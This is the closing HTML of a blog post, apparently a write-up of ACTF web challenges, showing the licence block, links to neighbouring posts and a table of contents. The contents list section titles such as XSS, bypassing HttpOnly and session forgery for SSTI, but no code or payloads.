</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://www.squirt1e.top">Squirt1e</a></p><p> <span>Link:  </span><a href="http://www.squirt1e.top/2023/10/31/actf-web/">http://www.squirt1e.top/2023/10/31/actf-web/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2023/10/31/hacklu-liang-dao-xss/" title="记hack.lu两道XSS题"><span>< PreviousPost</span><br><span class="prevTitle">记hack.lu两道XSS题</span></a><a class="nextSlogan" href="/2023/09/20/wa-jue-mou-cms-qian-tai-rce-zong-jie/" title="挖掘某cms漏洞总结"><span>NextPost ></span><br><span class="nextTitle">挖掘某cms漏洞总结</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#craftcms"><span class="toc-number">1.</span> <span class="toc-text">craftcms</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#easy-latex"><span class="toc-number">2.</span> <span class="toc-text">easy latex</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%88%90%E4%B8%BAvip"><span class="toc-number">2.1.</span> <span class="toc-text">成为vip</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS"><span class="toc-number">2.2.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87http-only"><span class="toc-number">2.3.</span> <span class="toc-text">绕过http only</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#story"><span class="toc-number">3.</span> <span class="toc-text">story</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%88%90%E4%B8%BAvip%EF%BC%88%E9%AA%8C%E8%AF%81%E7%A0%81%E7%94%9F%E6%88%90%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">成为vip（验证码生成逻辑错误）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#session%E4%BC%AA%E9%80%A0%E6%89%93SSTI"><span class="toc-number">3.2.</span> <span class="toc-text">session伪造打SSTI</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MyGO%E2%80%99s-Live"><span class="toc-number">4.</span> <span class="toc-text">MyGO’s Live!!!!!</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>